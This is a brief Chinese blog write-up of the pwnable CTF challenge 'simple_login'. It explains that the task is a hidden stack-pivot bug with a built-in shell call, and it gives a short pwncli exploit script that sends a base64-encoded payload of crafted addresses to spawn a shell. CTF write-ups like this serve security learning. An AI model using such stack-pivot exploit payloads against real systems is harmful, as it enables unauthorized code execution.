# pwnable_simple_login



### 总结

本以为是要逆一下`MD5`，后来定睛一看，原来是个隐藏的栈迁移的题，还自带`system("/bin/sh")`。怪不得叫`login`，的确是签到题。也只记录下`exp`。

<!-- more -->

### Exp

```python
from pwncli import *

cli_script()

p:tube = gift['io']

payload = p32(0xdeadbeef) + p32(0x804925f) + p32(0x811eb40)

p.sendline(b64e(payload))

p.interactive()
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-08-20-pwnable-simple-login/  

